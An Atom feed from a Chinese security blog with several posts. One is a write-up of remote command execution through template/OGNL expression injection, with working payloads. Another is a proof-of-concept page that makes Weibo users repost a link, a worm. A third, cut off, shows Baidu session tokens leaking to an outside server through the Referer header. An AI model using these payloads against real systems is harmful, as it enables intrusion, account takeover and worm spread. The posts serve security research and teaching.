<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://magicbluech.github.io/"/>
  <updated>2017-12-02T05:51:54.914Z</updated>
  <id>https://magicbluech.github.io/</id>
  
  <author>
    <name>MagicBlue</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>VelocityServlet  Expression-language  Injection</title>
    <link href="https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/"/>
    <id>https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/</id>
    <published>2017-12-02T03:59:38.000Z</published>
    <updated>2017-12-02T05:51:54.914Z</updated>
    
    <content type="html"><![CDATA[<p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-11-15</p><h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>朋友丢过来一个站点让帮忙看看。站点的架构为 Windows+Apache+JAVA。因没学过JAVA WEB。特记录下Exploit的过程,希望借此鼓励因对一门技术栈不熟悉就放弃目标的朋友。</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><h4 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h4><p>拿到站点，首先要知道站点的架构。不难发现站点的架构为Windows+Apache+JAVA。通常,我还会爬一遍站点的url。探测是否存在敏感文件泄露以及敏感url,参数泄漏。扩大自己的攻击面。</p><p>经过简单探测,发现了一处疑似表达式注入的点,并且还出现了报错(可以泄漏很多有用的信息)。</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107577343702.jpg" alt=""></p><p>但是由于我只写过JAVA,并没有任何JAVA WEB 经验。我连这个站点运用了什么框架都不清楚。于是开始漫长的踩坑之旅。在我以前的记忆中,我只知道两种类型的表达式注入(OGNL+EL)</p><p>首先我们测试下是否存在漏洞？ <code>${666*666}</code></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107592203135.jpg" alt=""></p><p>看到这里,就有很大的几率存在漏洞。但是对于我们还是判断不了它到底用了什么表达式语言。因为我没学过这块的技术栈，在这里就不去区分OGNL+EL的异同点,从而判断是哪种表达式。但是我知道OGNL+EL都有隐含对象。比如<em>${pageScope},${request}</em>等。但是很遗憾,什么也没有回显。</p><p>仔细查看报错信息,说不定会有收获。VelocityServlet: Error processing the template。一行加粗加大的提示赫然出现在我的眼前。Google=&gt;Velocity</p><p>发现一篇<a href="http://blog.portswigger.net/2015/08/server-side-template-injection.html" target="_blank" rel="noopener">文章</a>  这篇文章提到这种表达式的注入<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107595249824.jpg" alt=""></p><p>尝试${class}<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107595914308.jpg" alt=""></p><p>于是这个站基本做到了认知的程度,下一步就是Fuzz了。</p><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>根据这篇文章,尝试以下payload.</p><blockquote><p>$class.inspect(“java.lang.Runtime”).type.getRuntime().exec(“sleep 5”).waitFor()<br>尝试无果。然后把注意点转移在<em>action.ListResources</em>这个类上。</p></blockquote><p>因为对JAVA并不熟悉,再加上面向对象学的也不是很好。无法判断这个类是开发者自己写的,还是用的轮子。只能利用搜索引擎去探测一波。发现<a href="https://gist.github.com/gkhays/1d90f75d9347cc2d7bc70f7bd56f31e7" target="_blank" rel="noopener">链接</a></p><p>于是开始了手工Fuzz</p><p><code>/list.do?c=${class.getClassLoader()}</code><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107600989282.jpg" alt=""></p><p><code>/list.do?c=${class.getResource(&quot;&quot;).getPath()}</code></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107601608543.jpg" alt=""><br>暴露了网站的路径</p><p>做到这里,朋友说已经可以了。但是我还想继续判断下是否存在RCE</p><p>猜测getResource 这个方法是用来获取资源的，猜测是否存在SSRF,于是进行了大量手工FUZZ。根据回显来判断是否正确<br><code>/list.do?c=${class.getResource(&quot;/&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;.&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;file://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;gopher://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;http://&quot;).getPath()}</code><br><code>/list.do?c=${class.getResource(&quot;../../../&quot;)}</code></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107604720015.jpg" alt=""></p><p><code>/list.do?c=${class.getResource(&quot;../../../../../index.htm&quot;).getContent()}</code><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107605658583.jpg" alt=""></p><p>出现了 java.io.BufferedInputStream@b4eccd。看样很有可能会产生任意读取漏洞。</p><p>还是不懂<a href="https://docs.oracle.com/javase/8/docs/api/java/io/BufferedInputStream.html#read-byte:A-int-int-" target="_blank" rel="noopener">BufferedInputStream</a> 只好借助参考链接</p><p>无奈 只发现了有价值的read()方法。借助可以方法可以从buff读取一个字符。由于我们找不到getWriter方法。所以我没有办法绕过去读取所有内容。下文有绕过方法。</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107608666530.jpg" alt=""></p><p>chr(60) = ‘&lt;’</p><h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>无奈只好去探测别的姿势。知识储备不够只好借助搜索引擎。翻到一篇<a href="http://www.vuln.cn/6934" target="_blank" rel="noopener">文章</a></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15107609801923.jpg" alt=""></p><p>尝试<br><code>${&#39;A&#39;.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;whoami&quot;)}</code><br>无果！ 难道就这么放弃？ 当然不是。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107612273604.jpg" alt=""></p><p>fuzz 出 ‘’.class.forName 这样引入对象是有效的。但是不知道为什么直接getRuntime不可以。<br>经过大量试错,最后 payload 为<br><code>list.do?c=${&#39;a&#39;.class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null).invoke(null,null).exec(&quot;cmd /c ping watito.exeye.io&quot;)}</code></p><h4 id="命令回显"><a href="#命令回显" class="headerlink" title="命令回显"></a>命令回显</h4><p>做到这里,朋友说可以了。但是,我觉得不是很好,因为到此还没做到命令回显，作为一个安全爱好者。漏洞利用就像一门艺术,如果不能做到命令回显那就感觉像是少了些什么。于是开始了新的踩坑之旅！<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108359183604.jpg" alt=""></p><p>执行payload。返回的是一个对象。我们要做的是将缓冲区的字节转换为字符。并且输出 出来。我查阅了大量的<a href="http://wooyun.jozxing.cc/search?keywords=%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5&amp;content_search_by=by_bugs" target="_blank" rel="noopener">实战案例</a>,<br>表达式注入做到回显的基本都用到了 servlet 下的 getWriter().println()方法。所以我们的目标已经很明确了,那就是去寻找这个方法。</p><p><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null)}</em><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108363833087.jpg" alt=""></p><p>我们想要使用的是println方法,于是又进行大量的手工FUZZ。</p><p><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).println(“2333”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke(null.null).println(“”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke().println(“”)}</em><br><em>/list.do?c=${&#x0025;23c=’a’.class.forName(“javax.servlet.http.HttpServletResponse”).getMethod(‘getWriter’,null).invoke(null,”23333”).println(“”)}</em></p><p>其实在这边查阅官方手册是快的,但是黑盒测试,对版本等信息都不了解。查阅了很多手册也没有什么收获。于是我去翻阅了java包的println函数的实现。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366776937.jpg" alt=""></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366895445.jpg" alt=""></p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/15108366979943.jpg" alt=""></p><p>原来println函数是import java.io.PrintWriter而来</p><p><em>/list.do?c=${&#x0023;c=”a”.class.forName(“java.io.PrintWriter”).getMethod(“println”,null)}</em><br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108368528524.jpg" alt=""></p><p>很激动～ 但是不知道怎么调用。还是要不断试错！</p><p><em>/list.do?c=${&#x0023;c=”a”.class.forName(“java.io.PrintWriter”).getMethod(“println”,null).(“HELLO WORLD”)}</em></p><p>发现这样可以调用。</p><p>我们看一下猪猪侠构造的回显的payload</p><p>&amp;#x0023;=#</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">$&#123;&amp;#x0023;a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;'/sbin/ifconfig','-a'&#125;)).start(),</span><br><span class="line">&amp;#x0023;b=&amp;#x0023;a.getInputStream(),</span><br><span class="line">&amp;#x0023;c=new **.**.**.**.InputStreamReader(&amp;#x0023;b),</span><br><span class="line">&amp;#x0023;d=new **.**.**.**.BufferedReader(&amp;#x0023;c),</span><br><span class="line">&amp;#x0023;e=new char[50000],&amp;#x0023;d.read(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;ringzero=&amp;#x0023;context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().println(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().flush(),</span><br><span class="line">&amp;#x0023;ringzero.getWriter().close()&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们尝试来构造我们自己的payload。</p><p>&amp;#x0023;=#</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&amp;#x0023;e='a'.class.forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cmd /c whoami").getInputStream(),</span><br><span class="line">&amp;#x0023;o=new java.io.InputStreamReader(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;l=new java.io.BufferedReader(&amp;#x0023;o),&amp;#x0023;t=new char[50000],</span><br><span class="line">&amp;#x0023;l.read(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;print='a'.class.forName("java.io.PrintWriter").getMethod("println",null),</span><br><span class="line">&amp;#x0023;flush='a'.class.forName("java.io.PrintWriter").getMethod("flush",null),</span><br><span class="line">&amp;#x0023;close='a'.class.forName("java.io.PrintWriter").getMethod("close",null),</span><br><span class="line">&amp;#x0023;print.(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;flush='a'.class.forName("java.io.PrintWriter").getMethod("flush",null).(),</span><br><span class="line">&amp;#x0023;close='a'.class.forName("java.io.PrintWriter").getMethod("close",null).()&#125;</span><br></pre></td></tr></table></figure><p>居然没什么反应～</p><p>这个时候似乎陷入了胶着…因为用时太久,身心俱疲。随手测试了${&#x0023;request}<br>居然有回显。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15108376127026.jpg" alt=""></p><p>可以确定是Ognl 表达式注入了.那么回显就要去朝着这个方向去思考。<br>看到 com.opensymphony.xwork.interceptor   版本比较低。</p><p>经过测试</p><p><em>{&#x0023;e=’a’.class.forName(“java.lang.Runtime”).getMethod(“getRuntime”,null).invoke(null,null).exec(“cmd /c whoami”).getInputStream(),&#x0023;o=new java.io.InputStreamReader(&#x0023;e),&#x0023;l=new java.io.BufferedReader(&#x0023;o),&#x0023;k=&#x0023;l.readLine(),&#x0023;print=’a’.class.forName(“java.io.PrintWriter”).getMethod(“println”,null),&#x0023;print.(&#x0023;k)}</em></p><p>这样可以读取一行回显 这样就太鸡肋了～ 这个时候想到一个库还没使用那就是。com.opensymphony.xwork</p><p><em>${&#x0023;response=&#x0023;context.get(“com.opensymphony.xwork.dispatcher.HttpServletResponse”).getWriter(),&#x0023;response.println(“HelloWorld!”),&#x0023;response.flush(),&#x0023;response.close()}</em></p><p>于是最终payload为</p><p>&amp;#x0023;=#</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$&#123;&amp;#x0023;response=&amp;#x0023;context.get(<span class="string">"com.opensymphony.xwork.dispatcher.HttpServletResponse"</span>).getWriter(),</span><br><span class="line">&amp;#x0023;e=<span class="string">'a'</span>.<span class="keyword">class</span>.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,null).invoke(null,null).exec(<span class="string">"cmd /c dir C:\\"</span>).getInputStream(),</span><br><span class="line">&amp;#x0023;o=new java.io.InputStreamReader(&amp;#x0023;e),</span><br><span class="line">&amp;#x0023;l=new java.io.BufferedReader(&amp;#x0023;o),&amp;#x0023;t=new char[<span class="number">90000</span>],</span><br><span class="line">&amp;#x0023;l.read(&amp;#x0023;t),&amp;#x0023;response.println(&amp;#x0023;t),</span><br><span class="line">&amp;#x0023;response.flush(),</span><br><span class="line">&amp;#x0023;response.close()&#125;</span><br></pre></td></tr></table></figure><p>使用这个姿势,同时可以解决上文的任意读取漏洞！有些朋友可能不理解为什么去费这么大气力去研究这个看似不是很重要的回显。完全可以通过DNS 带出来内容。但是技术的推动就是对技术毫不妥协嘛。本文不涉及任何框架的解读,想表达的含义是对一个你没接触的内容怎样去Exploit。对于这个场景来说,找一个可用的方法或者类有多么重要。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这篇writeup 用到的技术不是很高深,想必对JAVA WEB 很熟的人很快就能搞出来。但是我想在这篇文章里展示的是一种对于从来没接触过的技术栈 怎么去Exploit。看到这里你也很清楚了。善于利用搜索引擎。以及人工不断fuzz.逐渐去验证你的思路。慢慢缩小fuzz的范围以及payload。我花费了大量笔墨去阐述我走过的弯路,较小的笔墨去描述我成功执行的部分。看者自然有意。<br><img src="http://p0a5v6dfs.bkt.clouddn.com/15107617955124.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[+] Author:MagicBlue&lt;br&gt;[+] Team: NeSE security team&lt;br&gt;[+] From: &lt;a href=&quot;https://magicbluech.github.io&quot;&gt;https://magicbluech.github.io&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Neglected Web Security thought</title>
    <link href="https://magicbluech.github.io/2017/12/02/Neglected-Web-Security-thought/"/>
    <id>https://magicbluech.github.io/2017/12/02/Neglected-Web-Security-thought/</id>
    <published>2017-12-02T03:57:14.000Z</published>
    <updated>2017-12-02T03:58:00.333Z</updated>
    
    <content type="html"><![CDATA[<ul><li>take over your subdomain<ul><li><a href="https://www.slideshare.net/fransrosen/dns-hijacking-using-cloud-providers-no-verification-needed-76812183" target="_blank" rel="noopener">DNS hijacking using cloud providers</a></li></ul></li></ul><ul><li><p>DNS SPF Record Spoofing</p><ul><li><a href="https://www.digitalocean.com/community/tutorials/how-to-use-an-spf-record-to-prevent-spoofing-improve-e-mail-reliability" target="_blank" rel="noopener">paper</a></li><li><a href="https://hackerone.com//reports/234701" target="_blank" rel="noopener">hackerone case</a></li></ul></li><li><p>unicode vulnerability</p><ul><li><a href="http://thehackernews.com/2017/04/unicode-Punycode-phishing-attack.html" target="_blank" rel="noopener">Phishing Attack</a></li></ul></li><li><p>Autobinding vulns</p><ul><li><a href="http://agrrrdog.blogspot.jp/2017/03/autobinding-vulns-and-spring-mvc.html" target="_blank" rel="noopener">Spring MVC</a></li><li><a href="https://threathunter.org/topic/593ff6bc9c58e020408a79d4" target="_blank" rel="noopener">case</a></li></ul></li><li><p>cross-domain login detection code</p><ul><li><a href="https://www.whitehatsec.com/blog/x-frame-options-xfo-detection-from-javascript/" target="_blank" rel="noopener">X-Frame-Options (XFO) Detection from Javascript</a></li><li><a href="http://blog.jeremiahgrossman.com/2006/12/i-know-if-youre-logged-in-anywhere.html" target="_blank" rel="noopener">old vector</a></li></ul></li><li><p>QRLJacking</p><ul><li><a href="https://www.seekurity.com/blog/tutorials/qrljacking-your-qr-based-session-belongs-to-us/" target="_blank" rel="noopener">QRLJacking</a></li></ul></li><li><p>abuse normal function</p><ul><li><a href="https://www.arneswinnen.net/2016/07/how-i-could-steal-money-from-instagram-google-and-microsoft/" target="_blank" rel="noopener">Steal Money by normal function</a></li><li><a href="https://www.bleepingcomputer.com/news/security/prmitm-attackers-can-hide-password-resets-inside-account-registrations/" target="_blank" rel="noopener">PRMitM attack</a></li></ul></li><li><p>cross protocol script</p><ul><li><a href="http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html" target="_blank" rel="noopener">Trying to hack Redis via HTTP requests</a></li><li><a href="https://www.leavesongs.com/PENETRATION/getshell-via-ssrf-and-redis.html" target="_blank" rel="noopener">case ssrf + urllib injection+cross protocol script+python unserialize</a></li></ul></li><li><p><a href="http://web-in-security.blogspot.de/2017/07/cors-misconfigurations-on-large-scale.html" target="_blank" rel="noopener">CORS misconfiguration</a></p></li></ul><ul><li><p><a href="http://blog.thinkst.com/p/canarytokensorg-quick-free-detection.html" target="_blank" rel="noopener">日志记录</a></p></li><li><p><a href="https://defuse.ca/race-conditions-in-web-applications.htm" target="_blank" rel="noopener">Race Condition</a></p><ul><li><a href="https://zhuanlan.zhihu.com/p/27626957" target="_blank" rel="noopener">刷钱漏洞</a></li></ul></li><li><p><a href="https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/" target="_blank" rel="noopener">IE Text/Plain</a></p></li><li><p><a href="https://hackerone.com/reports/126197" target="_blank" rel="noopener">IE  MIME Sniffing</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;take over your subdomain&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.slideshare.net/fransrosen/dns-hijacking-using-cloud-providers-no-verification
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>SOME攻击可导致点我链接蠕虫+关注</title>
    <link href="https://magicbluech.github.io/2017/12/02/SOME%E6%94%BB%E5%87%BB%E5%8F%AF%E5%AF%BC%E8%87%B4%E7%82%B9%E6%88%91%E9%93%BE%E6%8E%A5%E8%A0%95%E8%99%AB-%E5%85%B3%E6%B3%A8/"/>
    <id>https://magicbluech.github.io/2017/12/02/SOME攻击可导致点我链接蠕虫-关注/</id>
    <published>2017-12-02T03:24:03.000Z</published>
    <updated>2017-12-02T03:58:29.023Z</updated>
    
    <content type="html"><![CDATA[<p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-02-06</p><h4 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h4><p>最近在研究新浪通行证的单点登录系统。发现了一个有意思的链接</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/phppKS1M81.png" alt=""></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>尝试了几个特殊字符想构建xss无果。于是想到了same origin method execute attack。因为这个域名是weibo.com。这是非常好利用的。利用点如下。微博存在一键转发一键关注等按钮。我们可以发一条很有吸引力的微博，诱惑别人去点。别人点我的链接就会触发攻击。会自动转发我的链接。这样就造成了蠕虫。其实SOME攻击可利用的地方很多。还是看场景。</p><p>但是有一个问题就是，此页面判断了refer。refer只能来自可信域名。尝试绕过无果。意外发现了当refer为空的时候会返回我们想要的结果。因为refer 会返回错误 但是不显示空白 我们依旧可利用 构造我们的callback</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com/phpQpMq8r2.png" alt=""></p><p>这个时候思路如下<br>1 找一个可信域下的302跳转。跳转到some利用页面。这样refer可信。成功利用<br>2 我们想办法去消除refer。感谢html5 a 标签的rel=”noreferrer” 可以使跳转不带有refer(:然后利用js自动点击a标签 做到和自动跳转一样的效果<br>3 利用iframe 也可以使用refer为空<br>我们采用第二种方法成本最低</p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><figure class="highlight html"><figcaption><span>main.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Main<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onclick</span>=<span class="string">"fuck()"</span> <span class="attr">target</span>=<span class="string">"_black"</span> <span class="attr">href</span>=<span class="string">"step.html"</span>&gt;</span>click here to see cool things.<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">function fuck()&#123;</span></span><br><span class="line"><span class="undefined">window.location.href="自己的微博转发地址";</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><figcaption><span>step.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://weibo.com/ajaxlogin.php?framelogin=1&amp;callback=opener.window.document.body.firstElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.lastElementChild.firstElementChild.firstElementChild.firstElementChild.firstElementChild.lastElementChild.lastElementChild.firstElementChild.firstElementChild.nextElementSibling.firstElementChild.firstElementChild.firstElementChild.firstElementChild.firstElementChild.lastElementChild.firstElementChild.lastElementChild.click"</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span> <span class="attr">id</span>=<span class="string">"fuck"</span> &gt;</span>2333<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">window.onload = function()&#123;</span></span><br><span class="line"><span class="undefined">function fuck()&#123;</span></span><br><span class="line"><span class="undefined">var a=document.getElementById('fuck');</span></span><br><span class="line"><span class="undefined">a.click();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined">setTimeout(fuck,8000);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><video id="video" width="500" height="240" controls preload="none" poster="http://media.w3.org/2010/05/sintel/poster.png"><br><source id="mp4" src="http://p0a5v6dfs.bkt.clouddn.com/some.mp4" type="video/mp4"><br><p>SOME ATTACK</p><br></video>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[+] Author:MagicBlue&lt;br&gt;[+] Team: NeSE security team&lt;br&gt;[+] From: &lt;a href=&quot;https://magicbluech.github.io&quot;&gt;https://magicbluech.github.io&lt;/
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>百度v3登陆系统架构问题导致点我链接拿到你的bduss(巧用referer)</title>
    <link href="https://magicbluech.github.io/2017/12/02/%E7%99%BE%E5%BA%A6v3%E7%99%BB%E9%99%86%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E9%97%AE%E9%A2%98%E5%AF%BC%E8%87%B4%E7%82%B9%E6%88%91%E9%93%BE%E6%8E%A5%E6%8B%BF%E5%88%B0%E4%BD%A0%E7%9A%84bduss-%E5%B7%A7%E7%94%A8referer/"/>
    <id>https://magicbluech.github.io/2017/12/02/百度v3登陆系统架构问题导致点我链接拿到你的bduss-巧用referer/</id>
    <published>2017-12-02T02:59:01.000Z</published>
    <updated>2017-12-02T03:58:10.299Z</updated>
    
    <content type="html"><![CDATA[<p>[+] Author:MagicBlue<br>[+] Team: NeSE security team<br>[+] From: <a href="https://magicbluech.github.io">https://magicbluech.github.io</a><br>[+] Create: 2017-02-13</p><h4 id="认知"><a href="#认知" class="headerlink" title="认知"></a>认知</h4><p>最近在研究百度的账号登陆系统。百度的登陆系统有v2,v3两种方案。主站使用的v2。通过post login。然后set-cookie:bduss</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com//15121828711818.jpg" alt=""></p><p>像百度钱包百度外卖,网盘等使用的v3登陆系统。使用v3登陆系统的域名不在少数。</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com//15121829104156.jpg" alt=""></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>可以看出来v3的登陆逻辑是Location重定向这个链接,然后set-cookie:bduss。但是这个有一个架构问题是Location里面带有bduss敏感信息:)需要注意的是Location里面的bduss不是登陆成功后cookie里面的那个http-only bduss。但是我们可以通过拿到Location的bduss去登陆,通过在本地查看cookie里面的http-only bduss。也就是拿到了用户认证</p><p><code>https://passport.baidu.com/v3/login/api/auth?return_type=3&amp;tpl=netdisk&amp;u=https%3a%2f%2fpcsdata.baidu.com%2frest%2f2.0%2fpcs%2ffile%3fmethod%3dplantcookie%26source%3dpcsdata%26callid%3d0.1%26type%3dstoken%26from_module%3dcloud-ui%26logid%3d1005224845347345453</code></p><p>访问这个url就会跳转到set-cookie:bduss 中间有个Location。对我们来说有用的可控的参数是tpl和utpl参数是百度业务的代号 netdisk为百度网盘u为Location中拼接的链接 :)  Location: u+stoken+bduss 这种到这里我能想到如下几种方法去窃取Location：</p><ol><li>没有任何限制 u参数可以为我们可控的domain。通过重定向到可控域名查看referer就可以拿到stoken+bduss</li><li>后端正则没写好 :) http:xxx.baidu.com.attack.com or <a href="http://xxx.baidu.com@attack.com" target="_blank" rel="noopener">http://xxx.baidu.com@attack.com</a></li><li>使用v3登陆系统下的xss</li><li>使用v3登陆系统下的open redirection</li><li>使用v3登陆系统下任何请求第三方服务器资源的参数 :)有点迷糊吧 接下来我会详细介绍这个</li></ol><p>下面我们来分析者几种思路的可行性</p><p>1 and 2    经过大量测试,百度后端正则写法严格,不存在此漏洞<br>3 xss价值很大,用在这大材小用。<br>4 方法不够优美,跳转后的页面为第三方页面,用户容易起疑心<br>5 跳转后的页面为百度下的域名 较为完美的解决方案 第五种方法容易出现在用户交互的地方。我在贴吧找到了一个分享页面。</p><p><code>http://tieba.baidu.com/f/commit/share/openShareApi?url=http%3A%2F%2Ftieba.baidu.com%2Fp%2F4970918825%2310006-tieba-1-38713-bf6461719a993b4683f4212b1604e413&amp;title=2017%E6%9D%8E%E5%BD%A6%E5%AE%8F%E4%B8%8B%E7%8B%A0%E5%BF%83%3A%E7%99%BE%E5%BA%A6%E8%A6%81%E6%95%B4%E9%A1%BF%E9%A3%8E%E6%B0%94%2C%E6%89%93%E5%87%BB%E8%BF%87%E5%BA%A6%E5%B9%BF%E5%91%8A_%E7%99%BE%E5%BA%A6%E5%90%A7_%E7%99%BE%E5%BA%A6%E8%B4%B4%E5%90%A7&amp;desc=&amp;comment=&amp;pic=http://121.42.166.76/x/phpwaf.php?.jpg</code></p><p>pic是我们可控的页面。查看下服务器上的log</p><p><img src="http://p0a5v6dfs.bkt.clouddn.com//15121831138103.jpg" alt=""></p><p>通过查看referer,我们就可以拿到bduss+stoken。    现在利用链就出现了。passport.baidu.com url里面的u参数改成tieba这个链接。tpl参数改成百度贴吧的内部代号。但是问题出现了。贴吧业务较老。同时有v2 